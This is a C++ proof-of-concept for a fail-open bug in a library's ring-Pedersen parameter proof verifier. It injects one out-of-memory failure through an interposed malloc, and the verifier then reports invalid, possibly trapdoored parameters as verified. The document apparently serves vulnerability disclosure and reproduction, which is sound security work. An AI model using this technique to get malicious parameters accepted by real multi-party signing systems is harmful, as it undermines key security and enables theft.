// POC: ring_pedersen_parameters_zkp_verify() returns ZKP_SUCCESS ("verified")
// on objectively invalid ring-Pedersen parameters when one specific OpenSSL
// allocation fails.
//
// src/common/crypto/commitments/ring_pedersen.c:787-800
//
//     status = init_ring_pedersen_param_zkp(&proof, ctx);   // sets status = ZKP_SUCCESS (0)
//     if (status != ZKP_SUCCESS) goto cleanup;
//
//     t_pow_z = BN_CTX_get(ctx);
//     if (!t_pow_z) goto cleanup;      // <-- status is STILL ZKP_SUCCESS here
//
//     status = ZKP_VERIFICATION_FAILED;   // <-- never reached on that path
//     ... all the actual checks ...
//   cleanup:
//     ... ; return status;                // <-- returns ZKP_SUCCESS
//
// So the `!t_pow_z` branch is a fail-OPEN: the caller is told the peer's
// (N, s, t) were proven well-formed while literally zero checks ran --
// not the compositeness test on N, not the coprimality tests, and none of
// the 80 t^z == A*s^e equations.
//
// Reachability of that exact allocation:
//   init_ring_pedersen_param_zkp() performs 2*RING_PEDERSEN_STATISTICAL_SECURITY
//   = 2*80 = 160 BN_CTX_get() calls on a freshly created BN_CTX.  OpenSSL's
//   BN_CTX pool hands out BIGNUMs in blocks of BN_CTX_POOL_SIZE == 16, and
//   160 % 16 == 0, so those 160 gets exactly fill 10 BN_POOL_ITEMs.  The 161st
//   get -- t_pow_z -- is therefore forced to OPENSSL_malloc() an 11th
//   BN_POOL_ITEM.  It is the only get in the function that must allocate.
//
// This PoC proves that mechanically:
//   PHASE 1  calibrate sizeof(BN_POOL_ITEM) by observing OpenSSL allocations
//            while draining a BN_CTX.
//   PHASE 2  independently confirm the "161st get is the allocating get"
//            premise: 160 gets succeed with 10 pool-item allocations, and
//            failing the 11th makes get #161 return NULL.
//   PHASE 3  call ring_pedersen_parameters_zkp_verify() on invalid parameters,
//            with and without that single allocation failure, and print the
//            returned status.
//
// No source file is modified.  The only instrumentation is OpenSSL's own
// public CRYPTO_set_mem_functions() hook.

#include "crypto/commitments/ring_pedersen.h"
#include "ring_pedersen_internal.h"

#include <openssl/bn.h>
#include <openssl/crypto.h>
#include <openssl/rand.h>

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <map>
#include <vector>

// ---------------------------------------------------------------------------
// Instrumented allocator.
//
// We interpose malloc() in the main executable, so OpenSSL's OPENSSL_malloc()
// (which in 3.x tail-calls libc malloc) hits our hook.  This models a real
// system OOM rather than an OpenSSL-specific hook, and it works even though
// libcosigner.so initialises OpenSSL before main() runs (which is why
// CRYPTO_set_mem_functions() is not usable here).
// ---------------------------------------------------------------------------
extern "C" void *__libc_malloc(size_t);

static bool                   g_recording = false;
static std::map<size_t, int> *g_sizes     = nullptr;  // size -> count, while recording
static bool                   g_in_hook   = false;    // reentrancy guard

static bool   g_armed      = false;  // fail matching allocations?
static size_t g_target_sz  = 0;      // which allocation size to count
static int    g_seen       = 0;      // how many of that size seen since arming
static int    g_fail_index = 0;      // fail the g_fail_index-th one (1-based)
static bool   g_fired      = false;  // did we actually inject a failure?

extern "C" void *malloc(size_t num)
{
    if (!g_in_hook) {
        if (g_recording && g_sizes) {
            g_in_hook = true;          // the map itself allocates
            (*g_sizes)[num]++;
            g_in_hook = false;
        }
        if (g_armed && num == g_target_sz) {
            if (++g_seen == g_fail_index) {
                g_fired = true;
                return nullptr;        // <-- the injected OOM
            }
        }
    }
    return __libc_malloc(num);
}

namespace {

void arm(size_t sz, int idx)
{
    g_armed = true; g_target_sz = sz; g_seen = 0; g_fail_index = idx; g_fired = false;
}
void disarm() { g_armed = false; g_fired = false; g_seen = 0; }

const char *zkp_name(zero_knowledge_proof_status s)
{
    switch (s) {
    case ZKP_SUCCESS:             return "ZKP_SUCCESS";
    case ZKP_INVALID_PARAMETER:   return "ZKP_INVALID_PARAMETER";
    case ZKP_OUT_OF_MEMORY:       return "ZKP_OUT_OF_MEMORY";
    case ZKP_VERIFICATION_FAILED: return "ZKP_VERIFICATION_FAILED";
    case ZKP_INSUFFICIENT_BUFFER: return "ZKP_INSUFFICIENT_BUFFER";
    default:                      return "ZKP_UNKNOWN_ERROR";
    }
}

// ---------------------------------------------------------------------------
// PHASE 1 -- discover sizeof(BN_POOL_ITEM) empirically.
// 160 BN_CTX_get() calls on a fresh ctx allocate exactly 10 pool items, so the
// pool-item size is the allocation size seen exactly 10 times.
// ---------------------------------------------------------------------------
size_t calibrate_pool_item_size()
{
    BN_CTX *ctx = BN_CTX_new();
    BN_CTX_start(ctx);

    std::map<size_t, int> sizes;
    g_sizes = &sizes;
    g_recording = true;
    for (int i = 0; i < 160; ++i) {
        if (!BN_CTX_get(ctx)) { printf("  calibration: get %d failed\n", i); break; }
    }
    g_recording = false;
    g_sizes = nullptr;

    printf("  heap allocations observed during 160 BN_CTX_get() calls:\n");
    size_t found = 0;
    int    n_found = 0;
    for (const auto &kv : sizes) {
        printf("      size %5zu bytes  x %d%s\n", kv.first, kv.second,
               kv.second == 10 ? "   <-- BN_POOL_ITEM (160/16 = 10 blocks)" : "");
        if (kv.second == 10) { found = kv.first; n_found++; }
    }
    if (n_found != 1) { printf("  ambiguous calibration (%d candidates)\n", n_found); return 0; }

    BN_CTX_end(ctx);
    BN_CTX_free(ctx);
    return found;
}

// ---------------------------------------------------------------------------
// PHASE 2 -- confirm the 161st get is the one that must allocate.
// ---------------------------------------------------------------------------
bool confirm_161st_get_allocates(size_t pool_item_sz)
{
    BN_CTX *ctx = BN_CTX_new();
    BN_CTX_start(ctx);

    arm(pool_item_sz, 11);            // let 10 pool items through, fail the 11th

    int ok = 0;
    for (int i = 0; i < 160; ++i)
        if (BN_CTX_get(ctx)) ok++;

    printf("  gets 1..160 (what init_ring_pedersen_param_zkp does): %d succeeded, "
           "%d pool-item allocations consumed\n", ok, g_seen);

    BIGNUM *b161 = BN_CTX_get(ctx);   // this is t_pow_z
    printf("  get #161 (t_pow_z)                                  : %s%s\n",
           b161 ? "returned a BIGNUM" : "returned NULL",
           g_fired ? "   <-- our injected OOM hit exactly here" : "");

    disarm();
    BN_CTX_end(ctx);
    BN_CTX_free(ctx);
    return ok == 160 && b161 == nullptr;
}

// ---------------------------------------------------------------------------
// Build objectively-invalid ring-Pedersen public parameters.
// ---------------------------------------------------------------------------
ring_pedersen_public_t *make_pub(BIGNUM *n, BIGNUM *s, BIGNUM *t)
{
    ring_pedersen_public_t *pub =
        (ring_pedersen_public_t *)calloc(1, sizeof(ring_pedersen_public_t));
    pub->n = n; pub->s = s; pub->t = t; pub->mont = nullptr;
    return pub;
}

uint32_t proof_size_for(const BIGNUM *n)
{
    return sizeof(uint32_t) * 2 + (uint32_t)(BN_num_bytes(n) * 2) * 80;
}

// ---------------------------------------------------------------------------
// PHASE 3 -- the actual vulnerability.
// ---------------------------------------------------------------------------
void run_case(const char *title, const char *why_invalid,
              ring_pedersen_public_t *pub, const std::vector<uint8_t> &proof,
              size_t pool_item_sz, int &failures)
{
    static const uint8_t aad[] = "poc-aad";

    printf("\n  CASE: %s\n", title);
    printf("    why these parameters are invalid: %s\n", why_invalid);

    // --- baseline: no memory pressure -------------------------------------
    if (pub->mont) { BN_MONT_CTX_free(pub->mont); pub->mont = nullptr; }
    zero_knowledge_proof_status base = ring_pedersen_parameters_zkp_verify(
        pub, aad, sizeof(aad), proof.data(), (uint32_t)proof.size());
    printf("    [A] normal conditions            -> %s\n", zkp_name(base));

    // --- with the 11th BN_POOL_ITEM allocation failed ----------------------
    if (pub->mont) { BN_MONT_CTX_free(pub->mont); pub->mont = nullptr; }
    arm(pool_item_sz, 11);
    zero_knowledge_proof_status inj = ring_pedersen_parameters_zkp_verify(
        pub, aad, sizeof(aad), proof.data(), (uint32_t)proof.size());
    bool fired = g_fired;
    disarm();
    printf("    [B] 11th BN_POOL_ITEM malloc = NULL -> %s   (injection %s)\n",
           zkp_name(inj), fired ? "fired" : "DID NOT FIRE");

    if (base == ZKP_SUCCESS) {
        printf("    !! baseline already accepted -- test is meaningless\n");
        failures++;
    } else if (inj == ZKP_SUCCESS && fired) {
        printf("    ==> FAIL-OPEN CONFIRMED: invalid parameters reported as VERIFIED,\n"
               "        with zero checks executed.\n");
    } else {
        printf("    ==> no fail-open observed for this case\n");
        failures++;
    }
}

} // namespace

int main()
{
    printf("========================================================================\n");
    printf(" POC: fail-open in ring_pedersen_parameters_zkp_verify()\n");
    printf("      src/common/crypto/commitments/ring_pedersen.c:794-799\n");
    printf("========================================================================\n");

    printf("\n[PHASE 1] Calibrating sizeof(BN_POOL_ITEM)\n");
    size_t pool_item_sz = calibrate_pool_item_size();
    if (!pool_item_sz) { printf("  calibration failed\n"); return 2; }
    printf("  => BN_POOL_ITEM = %zu bytes (BN_CTX_POOL_SIZE = 16 BIGNUMs + links)\n",
           pool_item_sz);

    printf("\n[PHASE 2] Confirming the 161st BN_CTX_get is the allocating get\n");
    bool premise = confirm_161st_get_allocates(pool_item_sz);
    printf("  => premise %s: init_ring_pedersen_param_zkp's 160 gets never allocate\n"
           "     an 11th block; t_pow_z (get #161) is the first one that must.\n",
           premise ? "HOLDS" : "DOES NOT HOLD");
    if (!premise) return 2;

    printf("\n[PHASE 3] ring_pedersen_parameters_zkp_verify() on invalid parameters\n");

    int failures = 0;
    BN_CTX *ctx = BN_CTX_new();

    // ---- Case A: N is PRIME -------------------------------------------------
    {
        BIGNUM *n = BN_new(), *s = BN_new(), *t = BN_new();
        BN_generate_prime_ex(n, 1024, 0, nullptr, nullptr, nullptr);
        BN_set_word(s, 3); BN_set_word(t, 5);
        ring_pedersen_public_t *pub = make_pub(n, s, t);
        std::vector<uint8_t> proof(proof_size_for(n), 0);
        *(uint32_t *)proof.data()                 = (uint32_t)BN_num_bytes(n);
        *(uint32_t *)(proof.data() + sizeof(uint32_t)) = 80;
        run_case("N is a 1024-bit PRIME, proof is all zeroes",
                 "a ring-Pedersen modulus must be a composite N = p*q; "
                 "a prime N makes the hiding/binding assumption vacuous",
                 pub, proof, pool_item_sz, failures);
        BN_free(n); BN_free(s); BN_free(t);
        if (pub->mont) BN_MONT_CTX_free(pub->mont);
        free(pub);
    }

    // ---- Case B: N composite (looks legitimate), proof is garbage ------------
    {
        BIGNUM *p = BN_new(), *q = BN_new(), *n = BN_new(), *s = BN_new(), *t = BN_new();
        BN_generate_prime_ex(p, 512, 0, nullptr, nullptr, nullptr);
        BN_generate_prime_ex(q, 512, 0, nullptr, nullptr, nullptr);
        BN_mul(n, p, q, ctx);
        BN_rand_range(s, n); BN_rand_range(t, n);       // s NOT proven to be in <t>
        ring_pedersen_public_t *pub = make_pub(n, s, t);
        std::vector<uint8_t> proof(proof_size_for(n));
        RAND_bytes(proof.data(), (int)proof.size());
        *(uint32_t *)proof.data()                 = (uint32_t)BN_num_bytes(n);
        *(uint32_t *)(proof.data() + sizeof(uint32_t)) = 80;
        run_case("N = p*q composite, s and t random, proof is random bytes",
                 "no proof that s lies in the group generated by t -- this is the "
                 "exact shape an attacker submits to plant trapdoored parameters",
                 pub, proof, pool_item_sz, failures);
        BN_free(p); BN_free(q); BN_free(n); BN_free(s); BN_free(t);
        if (pub->mont) BN_MONT_CTX_free(pub->mont);
        free(pub);
    }

    BN_CTX_free(ctx);

    printf("\n========================================================================\n");
    if (failures == 0)
        printf(" RESULT: fail-open reproduced. A single failed OPENSSL_malloc turns a\n"
               "         security verifier into an unconditional accept.\n");
    else
        printf(" RESULT: %d case(s) did NOT reproduce.\n", failures);
    printf("========================================================================\n");
    return failures == 0 ? 0 : 1;
}
